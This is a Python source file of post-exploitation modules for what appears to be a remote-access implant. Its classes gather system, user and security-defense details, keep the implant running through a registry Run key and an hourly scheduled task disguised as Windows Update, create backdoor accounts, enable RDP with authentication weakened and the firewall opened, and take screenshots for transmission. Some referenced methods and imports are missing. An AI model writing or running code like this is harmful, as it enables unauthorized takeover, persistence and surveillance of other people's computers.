#!/usr/bin/env python3
import os
import platform
import subprocess
import json
import base64
from base_module import BaseModule

class SystemInfoModule(BaseModule):
    def __init__(self):
        super().__init__()
        self.name = "sysinfo"
        self.description = "Get detailed system information"
    
    def run(self, agent, arguments):
        """Comprehensive system information gathering"""
        info = {
            'system': self.get_system_info(),
            'network': self.get_network_info(),
            'users': self.get_user_info(),
            'software': self.get_installed_software(),
            'defenses': self.get_security_defenses()
        }
        return json.dumps(info, indent=2)
    
    def get_system_info(self):
        import psutil
        return {
            'hostname': platform.node(),
            'os': platform.platform(),
            'architecture': platform.architecture()[0],
            'processor': platform.processor(),
            'ram_total_gb': round(psutil.virtual_memory().total / (1024**3), 2),
            'ram_available_gb': round(psutil.virtual_memory().available / (1024**3), 2),
            'boot_time': psutil.boot_time(),
            'current_user': psutil.Process().username()
        }
    
    def get_network_info(self):
        import psutil
        network_info = {}
        for interface, addrs in psutil.net_if_addrs().items():
            network_info[interface] = [
                {'family': addr.family.name, 'address': addr.address}
                for addr in addrs
            ]
        return network_info
    
    def get_user_info(self):
        """Get local user accounts"""
        try:
            if platform.system() == 'Windows':
                return self.get_windows_users()
            else:
                return self.get_linux_users()
        except:
            return "Unable to retrieve user info"
    
    def get_windows_users(self):
        """Get Windows user accounts"""
        try:
            result = subprocess.check_output(
                'net user', 
                shell=True, 
                stderr=subprocess.DEVNULL,
                stdin=subprocess.DEVNULL
            )
            return result.decode('utf-8', errors='ignore')
        except:
            return "Failed to get Windows users"

class PersistenceModule(BaseModule):
    def __init__(self):
        super().__init__()
        self.name = "persistence"
        self.description = "Establish persistence mechanisms"
        self.privileges = ["admin"]
    
    def run(self, agent, arguments):
        method = arguments.get('method', 'registry')
        
        if platform.system() != 'Windows':
            return "Persistence currently only supported on Windows"
        
        if method == 'registry':
            return self.registry_persistence(agent)
        elif method == 'scheduled_task':
            return self.scheduled_task_persistence(agent)
        elif method == 'service':
            return self.service_persistence(agent)
        elif method == 'startup':
            return self.startup_folder_persistence(agent)
        else:
            return f"Unknown persistence method: {method}"
    
    def registry_persistence(self, agent):
        """Windows Registry Run key persistence"""
        try:
            import winreg
            
            # Get current script path
            current_path = os.path.abspath(sys.argv[0])
            
            # Add to HKCU Run key
            key = winreg.HKEY_CURRENT_USER
            subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
            
            with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as reg_key:
                winreg.SetValueEx(reg_key, "WindowsUpdateService", 0, winreg.REG_SZ, current_path)
            
            return "Registry persistence established in HKCU Run key"
            
        except Exception as e:
            return f"Registry persistence failed: {str(e)}"
    
    def scheduled_task_persistence(self, agent):
        """Windows Scheduled Task persistence"""
        try:
            current_path = os.path.abspath(sys.argv[0])
            task_name = "WindowsUpdateMaintenance"
            
            # Create scheduled task that runs every hour
            cmd = f'schtasks /create /tn "{task_name}" /tr "{current_path}" /sc hourly /mo 1 /f'
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
            
            if result.returncode == 0:
                return f"Scheduled task '{task_name}' created successfully"
            else:
                return f"Scheduled task creation failed: {result.stderr}"
                
        except Exception as e:
            return f"Scheduled task persistence failed: {str(e)}"

class UserManagementModule(BaseModule):
    def __init__(self):
        super().__init__()
        self.name = "useradd"
        self.description = "Create user accounts and manage RDP"
        self.privileges = ["admin"]
    
    def run(self, agent, arguments):
        action = arguments.get('action', 'create')
        username = arguments.get('username', '')
        password = arguments.get('password', 'Password123!')
        
        if action == 'create':
            return self.create_user(username, password)
        elif action == 'enable_rdp':
            return self.enable_rdp()
        elif action == 'add_to_rdp_group':
            return self.add_user_to_rdp_group(username)
        else:
            return f"Unknown user management action: {action}"
    
    def create_user(self, username, password):
        """Create a new user account"""
        try:
            if platform.system() != 'Windows':
                return "User creation currently only supported on Windows"
            
            # Create user
            cmd = f'net user {username} {password} /add'
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
            
            if result.returncode == 0:
                return f"User '{username}' created successfully"
            else:
                return f"User creation failed: {result.stderr}"
                
        except Exception as e:
            return f"User creation error: {str(e)}"
    
    def enable_rdp(self):
        """Enable RDP on the system"""
        try:
            # Enable RDP
            cmd1 = 'reg add "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f'
            # Set NLA (optional)
            cmd2 = 'reg add "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d 0 /f'
            
            subprocess.run(cmd1, shell=True, capture_output=True)
            subprocess.run(cmd2, shell=True, capture_output=True)
            
            # Open firewall port
            subprocess.run('netsh advfirewall firewall add rule name="RDP" dir=in action=allow protocol=TCP localport=3389', 
                         shell=True, capture_output=True)
            
            return "RDP enabled and firewall configured"
            
        except Exception as e:
            return f"RDP enable failed: {str(e)}"

class ScreenshotModule(BaseModule):
    def __init__(self):
        super().__init__()
        self.name = "screenshot"
        self.description = "Capture screenshot"
    
    def run(self, agent, arguments):
        try:
            if platform.system() == 'Windows':
                return self.windows_screenshot()
            else:
                return "Screenshot currently only supported on Windows"
        except Exception as e:
            return f"Screenshot failed: {str(e)}"
    
    def windows_screenshot(self):
        """Capture screenshot on Windows"""
        try:
            import pyautogui
            screenshot = pyautogui.screenshot()
            
            # Convert to base64 for transmission
            import io
            from PIL import Image
            
            buffer = io.BytesIO()
            screenshot.save(buffer, format='PNG')
            screenshot_data = base64.b64encode(buffer.getvalue()).decode()
            
            return f"SCREENSHOT_DATA:{screenshot_data}"
            
        except ImportError:
            return "pyautogui not installed for screenshot functionality"

class ProcessManagerModule(BaseModule):
    def __init__(self):
        super().__init__()
        self.name = "process_list"
        self.description = "List running processes"
    
    def run(self, agent, arguments):
        try:
            import psutil
            
            processes = []
            for proc in psutil.process_iter(['pid', 'name', 'username', 'memory_percent', 'cpu_percent']):
                try:
                    processes.append(proc.info)
                except psutil.NoSuchProcess:
                    continue
            
            # Sort by memory usage
            processes.sort(key=lambda x: x['memory_percent'] or 0, reverse=True)
            
            result = "Running Processes:\n"
            result += "-" * 80 + "\n"
            result += f"{'PID':<8} {'Name':<20} {'User':<15} {'Memory %':<10} {'CPU %':<8}\n"
            result += "-" * 80 + "\n"
            
            for proc in processes[:20]:  # Show top 20
                result += f"{proc['pid']:<8} {proc['name'][:19]:<20} {proc['username'][:14]:<15} {proc['memory_percent'] or 0:<10.2f} {proc['cpu_percent'] or 0:<8.2f}\n"
            
            return result
            
        except Exception as e:
            return f"Process list error: {str(e)}"